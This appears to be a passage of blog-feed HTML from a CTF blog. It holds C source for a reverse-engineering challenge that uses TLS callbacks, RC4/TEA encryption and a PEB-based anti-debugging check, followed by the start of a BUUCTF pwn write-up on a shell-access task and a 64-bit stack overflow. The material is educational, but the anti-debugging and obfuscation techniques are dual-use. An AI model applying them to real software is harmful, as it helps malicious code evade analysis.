class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Header/BaseHeader.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/INCLUDE:_tls_used&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/INCLUDE:__tls_used&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// _WIN64</span></span><br><br><span class="hljs-type">void</span> NTAPI <span class="hljs-title function_">TLS_CALLBACK1</span><span class="hljs-params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> const_seg(<span class="hljs-string">&quot;.CRT$XLX&quot;</span>)</span><br><span class="hljs-type">const</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg(<span class="hljs-string">&quot;.CRT$XLX&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//</span><br><br><br><span class="hljs-comment">//存储回调函数地址</span><br>PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, nullptr &#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg()</span><br><br><span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;HELLO_TLS&quot;</span>;<br>DWORD KeyLen;<br><br>BYTE ans[] = &#123;<br>    <span class="hljs-number">0x13</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xa9</span>,<br>    <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x5a</span>,<br>&#125;;<br><span class="hljs-type">char</span> flag[MAX_PATH];<br><br>DWORD <span class="hljs-title function_">sha</span><span class="hljs-params">(<span class="hljs-type">char</span>* Data,DWORD DataLen)</span> &#123;<br>    DWORD HASH = <span class="hljs-number">0x534c54</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; DataLen; i++) HASH = HASH *<span class="hljs-number">31</span> + (BYTE)Data[i];<br>    <span class="hljs-keyword">return</span> HASH;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">HelloTLS</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;WELCOME TO TLS&#x27;S W&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Here you can learn about the process of TLS&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Start enjoying the challenges of TLS&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;FLAG:&quot;</span>);<br>    <span class="hljs-comment">// char flag[] = &quot;flag&#123;WOWW_Now_you_really_can!!!&#125;&quot;;</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, flag);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitBox</span><span class="hljs-params">(<span class="hljs-type">char</span>* BOX)</span> &#123;<br>    <span class="hljs-type">int</span> i, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) BOX[i] = key[i % KeyLen];<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>        j = (j + BOX[i] + key[i % KeyLen]) % <span class="hljs-number">256</span>;<br>        <span class="hljs-type">char</span> temp = BOX[i];<br>        BOX[i] = BOX[j];<br>        BOX[j] = temp;<br>    &#125;<br>&#125;<br><br>DWORD <span class="hljs-title function_">Rc4</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span> &#123;<br>    <span class="hljs-type">char</span> BOX[<span class="hljs-number">256</span>];<br>    <span class="hljs-type">int</span> i , j = <span class="hljs-number">0</span>;<br>    KeyLen = <span class="hljs-built_in">strlen</span>(key);<br><br>    InitBox(BOX);<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(flag); i++) &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + BOX[i]) % <span class="hljs-number">256</span>;<br>        BOX[i] = BOX[j];<br>        BOX[j] = key[i%KeyLen];<br>        flag[i] ^= BOX[key[i%KeyLen] &amp; <span class="hljs-number">0xff</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> sha(BOX,<span class="hljs-number">256</span>);<br>&#125;<br><br>DWORD <span class="hljs-title function_">Rc4_FAKE</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span> &#123;<br>    <span class="hljs-type">char</span> BOX[<span class="hljs-number">256</span>];<br>    <span class="hljs-type">int</span> i, j = <span class="hljs-number">0</span>;<br>    KeyLen = <span class="hljs-built_in">strlen</span>(key);<br><br>    InitBox(BOX);<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(flag); i++) &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + BOX[i]) % <span class="hljs-number">256</span>;<br>        BYTE temp = BOX[i];<br>        BOX[i] = BOX[j];<br>        BOX[j] = temp;<br>        flag[i] ^= BOX[(BOX[i] + BOX[j]) % <span class="hljs-number">256</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> sha(BOX,<span class="hljs-number">256</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">TEA</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag,DWORD KEY)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-built_in">strlen</span>(flag)/<span class="hljs-number">4</span>; j+=<span class="hljs-number">2</span>) &#123;<br>        DWORD* v = (DWORD*)flag;<br>        DWORD v0=v[j], v1=v[j+<span class="hljs-number">1</span>], sum=<span class="hljs-number">0</span>, i;<br>        DWORD delta=<span class="hljs-number">0x9e3779b9</span>;<br><br>        BYTE* k = (BYTE*)(&amp;KEY);<br>        BYTE k0=k[<span class="hljs-number">0</span>], k1=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>];<br><br>        <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>            sum += delta;<br>            v0 += ((v1&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="hljs-number">5</span>) + k1);<br>            v1 += ((v0&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="hljs-number">5</span>) + k3);<br>        &#125;<br>        v[j]=v0; v[j+<span class="hljs-number">1</span>]=v1;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Check_HASH</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span> &#123;<br>    DWORD ANS = sha(flag,<span class="hljs-built_in">strlen</span>(flag));<br>    <span class="hljs-keyword">switch</span> (ANS) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x68e19b96</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x534c54</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;FFFAAAKKKEEE&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x78909b38</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;YYYYEEEESSSS&quot;</span>);<br>        <span class="hljs-keyword">default</span>:<br>            ExitProcess(<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Check</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span> &#123;<br><br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(flag); i++) &#123;<br>       <span class="hljs-keyword">if</span> ((BYTE)flag[i] != ans[i]) &#123;<br>           ExitProcess(<span class="hljs-number">0</span>);<br>       &#125;<br>   &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;YYYYEEEESSSS&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ENCRYPT</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span> &#123;<br>    DWORD TMP = Rc4(flag);<br>    TEA(flag, TMP);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ENCRYPT_FAKE</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span> &#123;<br>    DWORD TMP = Rc4_FAKE(flag);<br>    TEA(flag, TMP);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">EZ_ENCRYPT</span><span class="hljs-params">(<span class="hljs-type">char</span>* flag)</span> &#123;<br>    <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(flag); i++) flag[i] ^= <span class="hljs-number">0x66</span>;<br>&#125;<br><br><span class="hljs-type">void</span> (*HELLO)() = nullptr;<br><span class="hljs-type">void</span> (*tENCRYPT)(<span class="hljs-type">char</span>*flag) = nullptr;<br><span class="hljs-type">void</span> (*tCheck)(<span class="hljs-type">char</span>*flag) = nullptr;<br><span class="hljs-type">void</span> (*Function_Change[])(<span class="hljs-type">char</span>*flag) = &#123;ENCRYPT,ENCRYPT_FAKE,nullptr&#125;;<br><br><br>DWORD co = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> NTAPI <span class="hljs-title function_">TLS_CALLBACK1</span><span class="hljs-params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span>&#123;<br>    <span class="hljs-keyword">switch</span> (dwReason) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            TerminateProcess(GetCurrentProcess(), <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">if</span> (co)tCheck = Check;<br>        tENCRYPT = Function_Change[PEB_Anti_Debug()];<br>        co = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            tENCRYPT = EZ_ENCRYPT;<br>        tCheck = Check_HASH;<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            TerminateProcess(GetCurrentProcess(), <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Thread_tENCRYPT</span><span class="hljs-params">(<span class="hljs-type">char</span> *param)</span> &#123;<br>    tENCRYPT(param);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Thread_tCheck</span><span class="hljs-params">(<span class="hljs-type">char</span> *param)</span> &#123;<br>    tCheck(param);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (!HELLO) HELLO = HelloTLS;<br>    HELLO();<br><br>    <span class="hljs-keyword">if</span> (!tENCRYPT) tENCRYPT = EZ_ENCRYPT;<br>    HANDLE hThread = CreateThread(nullptr, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)Thread_tENCRYPT, flag, <span class="hljs-literal">NULL</span>, nullptr);<br>    WaitForSingleObject(hThread, INFINITE);<br>    CloseHandle(hThread);<br><br>    <span class="hljs-keyword">if</span> (!tCheck) tCheck = Check_HASH;<br>    hThread = CreateThread(nullptr, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)Thread_tCheck, flag, <span class="hljs-literal">NULL</span>, nullptr);<br>    WaitForSingleObject(hThread, INFINITE);<br>    CloseHandle(hThread);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;BYTE BYTE&quot;</span>);<br>    TerminateProcess(GetCurrentProcess(), <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> STRUCT_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STRUCT_H</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CLIENT_ID32</span></span><br><span class="hljs-class">&#123;</span><br>    ULONG UniqueProcess;                                                    <span class="hljs-comment">//0x0</span><br>    ULONG UniqueThread;                                                     <span class="hljs-comment">//0x4</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CLIENT_ID64</span></span><br><span class="hljs-class">&#123;</span><br>    ULONGLONG UniqueProcess;                                                <span class="hljs-comment">//0x0</span><br>    ULONGLONG UniqueThread;                                                 <span class="hljs-comment">//0x8</span><br>&#125;;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">NT_TIB32</span> <span class="hljs-title">NtTib</span>;</span>                                                 <span class="hljs-comment">//0x0</span><br>    ULONG EnvironmentPointer;                                               <span class="hljs-comment">//0x1c</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CLIENT_ID32</span> <span class="hljs-title">ClientId</span>;</span>                                           <span class="hljs-comment">//0x20</span><br>    ULONG ActiveRpcHandle;                                                  <span class="hljs-comment">//0x28</span><br>    ULONG ThreadLocalStoragePointer;                                        <span class="hljs-comment">//0x2c</span><br>    ULONG ProcessEnvironmentBlock;                                          <span class="hljs-comment">//0x30</span><br>&#125;* P_TEB32;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PEB_LDR_DATA</span></span><br><span class="hljs-class">&#123;</span><br>    ULONG Length;                                                           <span class="hljs-comment">//0x0</span><br>    UCHAR Initialized;                                                      <span class="hljs-comment">//0x4</span><br>    VOID* SsHandle;                                                         <span class="hljs-comment">//0x8</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span> <span class="hljs-title">InLoadOrderModuleList</span>;</span>                               <span class="hljs-comment">//0xc</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span> <span class="hljs-title">InMemoryOrderModuleList</span>;</span>                             <span class="hljs-comment">//0x14</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span> <span class="hljs-title">InInitializationOrderModuleList</span>;</span>                     <span class="hljs-comment">//0x1c</span><br>    VOID* EntryInProgress;                                                  <span class="hljs-comment">//0x24</span><br>    UCHAR ShutdownInProgress;                                               <span class="hljs-comment">//0x28</span><br>    VOID* ShutdownThreadId;                                                 <span class="hljs-comment">//0x2c</span><br>&#125;;<br><br><span class="hljs-comment">//0x8 bytes (sizeof)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">UNICODE_STRING</span></span><br><span class="hljs-class">&#123;</span><br>    USHORT Length;                                                          <span class="hljs-comment">//0x0</span><br>    USHORT MaximumLength;                                                   <span class="hljs-comment">//0x2</span><br>    WCHAR* Buffer;                                                          <span class="hljs-comment">//0x4</span><br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">NT_TIB64</span> <span class="hljs-title">NtTib</span>;</span>                                                 <span class="hljs-comment">//0x0</span><br>    ULONGLONG EnvironmentPointer;                                           <span class="hljs-comment">//0x38</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CLIENT_ID64</span> <span class="hljs-title">ClientId</span>;</span>                                           <span class="hljs-comment">//0x40</span><br>    ULONGLONG ActiveRpcHandle;                                              <span class="hljs-comment">//0x50</span><br>    ULONGLONG ThreadLocalStoragePointer;                                    <span class="hljs-comment">//0x58</span><br>    ULONGLONG ProcessEnvironmentBlock;                                      <span class="hljs-comment">//0x60</span><br>&#125;* P_TEB64;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    UCHAR InheritedAddressSpace;                                            <span class="hljs-comment">//0x0</span><br>    UCHAR ReadImageFileExecOptions;                                         <span class="hljs-comment">//0x1</span><br>    UCHAR BeingDebugged;                                                    <span class="hljs-comment">//0x2</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        UCHAR BitField;                                                     <span class="hljs-comment">//0x3</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">        &#123;</span><br>            UCHAR ImageUsesLargePages:<span class="hljs-number">1</span>;                                    <span class="hljs-comment">//0x3</span><br>            UCHAR IsProtectedProcess:<span class="hljs-number">1</span>;                                     <span class="hljs-comment">//0x3</span><br>            UCHAR IsImageDynamicallyRelocated:<span class="hljs-number">1</span>;                            <span class="hljs-comment">//0x3</span><br>            UCHAR SkipPatchingUser32Forwarders:<span class="hljs-number">1</span>;                           <span class="hljs-comment">//0x3</span><br>            UCHAR IsPackagedProcess:<span class="hljs-number">1</span>;                                      <span class="hljs-comment">//0x3</span><br>            UCHAR IsAppContainer:<span class="hljs-number">1</span>;                                         <span class="hljs-comment">//0x3</span><br>            UCHAR IsProtectedProcessLight:<span class="hljs-number">1</span>;                                <span class="hljs-comment">//0x3</span><br>            UCHAR IsLongPathAwareProcess:<span class="hljs-number">1</span>;                                 <span class="hljs-comment">//0x3</span><br>        &#125;;<br>    &#125;;<br>    VOID* Mutant;                                                           <span class="hljs-comment">//0x4</span><br>    VOID* ImageBaseAddress;                                                 <span class="hljs-comment">//0x8</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PEB_LDR_DATA</span>* <span class="hljs-title">Ldr</span>;</span>                                              <span class="hljs-comment">//0xc</span><br>&#125;*P_PEB;<br><br><span class="hljs-comment">//0xa8 bytes (sizeof)</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span> <span class="hljs-title">InLoadOrderLinks</span>;</span>                                    <span class="hljs-comment">//0x0</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span> <span class="hljs-title">InMemoryOrderLinks</span>;</span>                                  <span class="hljs-comment">//0x8</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LIST_ENTRY</span> <span class="hljs-title">InInitializationOrderLinks</span>;</span>                          <span class="hljs-comment">//0x10</span><br>    VOID* DllBase;                                                          <span class="hljs-comment">//0x18</span><br>    VOID* EntryPoint;                                                       <span class="hljs-comment">//0x1c</span><br>    ULONG SizeOfImage;                                                      <span class="hljs-comment">//0x20</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">UNICODE_STRING</span> <span class="hljs-title">FullDllName</span>;</span>                                     <span class="hljs-comment">//0x24</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">UNICODE_STRING</span> <span class="hljs-title">BaseDllName</span>;</span>                                     <span class="hljs-comment">//0x2c</span><br>&#125;* P_LDR_DATA_TABLE_ENTRY;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">//STRUCT_H</span></span><br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">DWORD <span class="hljs-title function_">PEB_Anti_Debug</span><span class="hljs-params">()</span> &#123;<br>    P_TEB64 pteb = nullptr;<br>    P_PEB ppeb = nullptr;<br><br>    pteb = (P_TEB64)NtCurrentTeb();<br>    ppeb = (P_PEB)(pteb-&gt;ProcessEnvironmentBlock);<br><br>    <span class="hljs-keyword">return</span> ppeb-&gt;BeingDebugged;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Topic</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PWN-BUUCTF-1</title>
    <link href="/PWN-BUUCTF-1/"/>
    <url>/PWN-BUUCTF-1/</url>
    
    <content type="html"><![CDATA[<h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a><font style="color:rgb(33, 37, 41);">test_your_nc</font></h1><blockquote><p>连上就有shell</p></blockquote><blockquote><p>考点</p><ul><li>命令执行<ul><li>cat</li><li>nc</li></ul></li></ul><p>利用nc链接到目标靶机</p><p>利用cat命令将文件内容输出到终端上</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/../Images/1752484311032-b48ebb94-362b-4978-b0b1-72389fe001cc.png"></p><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a><font style="color:rgb(33, 37, 41);">rip</font></h1><blockquote><p>考点</p><ul><li>后门+64位栈溢出</li><li>栈平衡</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td 